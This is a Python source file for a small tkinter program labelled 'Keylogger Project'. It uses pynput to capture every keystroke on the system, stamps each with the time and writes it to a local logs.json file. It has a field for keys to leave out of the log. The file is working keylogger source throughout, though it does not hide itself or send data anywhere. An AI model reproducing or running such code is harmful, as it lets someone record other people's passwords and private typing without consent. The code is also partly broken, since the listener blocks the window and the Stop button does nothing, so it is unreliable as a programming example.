import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import time

# Function to update the logs in a JSON file
def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

# Function to handle key press events
def on_press(key):
    global x, key_list, filtered_keys

    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)

    if key_char in filtered_keys:
        return

    # Get the current timestamp
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

    if not x:
        key_list.append({'Timestamp': timestamp, 'Event': 'Pressed', 'Key': key_char})
    x = True

    if x:
        key_list.append({'Timestamp': timestamp, 'Event': 'Held', 'Key': key_char})

    update_json_file(key_list)

# Function to handle key release events
def on_release(key):
    global x, key_list, filtered_keys

    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)

    if key_char in filtered_keys:
        return

    key_list.append({'Timestamp': time.strftime('%Y-%m-%d %H:%M:%S'), 'Event': 'Released', 'Key': key_char})

    if x:
        x = False
        update_json_file(key_list)

# Function to start the keylogger
def start_keylogger():
    global filtered_keys
    filtered_keys = entry.get().split()  # Get the filtered keys from the entry widget
    print("[+] Running Keylogger successfully!\n[!] Saving the key logs in 'logs.json'")
    # Start the keylogger using pynput.Listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to stop the keylogger
def stop_keylogger():
    print("[+] Keylogger Stopped.")
    # You can add additional actions here if needed

# GUI setup
root = tk.Tk()
root.geometry("350x250")
root.title("Keylogger Project")

# Labels and Instructions
Label(root, text="Keylogger Project", font='verdana 14 bold').pack(pady=10)
Label(root, text="Click 'Start Keylogger' to begin logging keys.").pack(pady=5)

# Entry widget for key filtering
Label(root, text="Enter keys to filter (separated by spaces):").pack()
entry = Entry(root, width=40)
entry.pack(pady=5)

# Buttons
start_button = Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=5)

# Status Bar
status_label = Label(root, text="", bd=1, relief=SUNKEN, anchor=W)
status_label.pack(side=BOTTOM, fill=X)

# Key Filtering (Add the keys you want to filter here)
filtered_keys = []

# Global variable to track key press and release
x = False

# List to store key logs
key_list = []

root.mainloop()

